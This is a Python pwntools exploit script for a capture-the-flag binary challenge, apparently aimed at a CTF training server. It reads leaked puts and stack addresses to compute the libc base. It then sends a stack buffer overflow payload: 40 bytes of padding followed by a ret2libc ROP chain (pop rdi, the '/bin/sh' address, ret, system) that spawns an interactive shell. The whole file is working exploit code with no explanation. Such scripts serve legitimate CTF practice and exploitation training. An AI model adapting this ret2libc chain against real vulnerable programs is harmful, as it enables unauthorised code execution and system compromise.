#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
# ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["alacritty", "-e", "fish", "-c"]

gdbscript = """
    continue
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote("training.theromanxpl0.it", 42075)
        # r = remote("localhost", 1337)

    return r


def main():
    r = conn()
    
    log.info("...")
    pause()

    # 0x80e10

    leaks = r.recvline().decode().split("0x")
    puts_leak = int(leaks[1], 16)
    log.info(f"{hex(puts_leak & 0xFFF)}")
    
    stack_leak = int(leaks[2], 16)
    log.info(f"{hex(libc.sym.puts)}")
    libc.address = puts_leak - libc.sym.puts

    log.info(f"libc base: {hex(libc.address)}")
    log.info(f"buf: {hex(stack_leak)}")

    poprdi = 0x000000000002a3e5 
    binsh = 0x1d8678
    ret = 0x0000000000029cd6 
    
    payload = b"A" * 40
    payload += p64(libc.address + poprdi)
    payload += p64(libc.address + binsh)
    payload += p64(libc.address + ret)
    payload += p64(libc.sym.system)

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()

